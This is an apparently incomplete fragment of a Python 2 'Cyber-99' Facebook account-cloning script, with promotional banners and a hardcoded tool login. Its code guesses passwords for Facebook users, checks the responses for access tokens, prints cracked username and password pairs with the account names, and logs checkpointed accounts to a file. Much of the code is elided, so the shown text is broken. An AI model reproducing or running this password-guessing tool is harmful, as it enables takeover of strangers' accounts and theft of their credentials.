...
\033[1;93m     Facebook : Emran /Cyber/?ref=share
\033[1;93m     YouTube  : Emran cyber
\033[1;96m ♦♦♦================================================♦♦♦
"""
def tik():
	titik = ['.   ','..  ','... ']
...
\033[1;93m┃╰━╯┃╰━╯┃╰╯┃┃━┫┣━━┫╰━╯┣━━╯┃
\033[1;93m╰━━━┻━╮╭┻━━┻━━┻╯╱╱╰━━━┻━━━╯
\033[1;93m   ╱╱╱╱╭━╯┃https://www.facebook.com/groups/Emran Cyber 99/?ref=share
\033[1;93m   ╱╱╱╱╰━━╯
                                                                                                                                                                                                                             
"""

jalan(" \033[1;96m◈===========◈   \033[1;92mWelcome to Cyber-99    \033[1;96m◈===========◈")  
...
jalan("\033[1;93m To get any help join our Facebook Group \033[1;96m(Team Cyber-39 Official).")

jalan("\033[1;96m◈===============◈      \033[1;92mLet's start     \033[1;96m◈===============◈")

CorrectUsername = "Noman39"
CorrectPassword = "4039"
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful.Please subscribe my Channel(Noman Tech)'
...
def pilih_super():
	...
	jalan('    \033[1;97mCyber-39
 has started cloning please wait....')
	print  "  \033[1;36;48m ●⭕══════════════════◄►══════════════════⭕●" 
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[After72Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
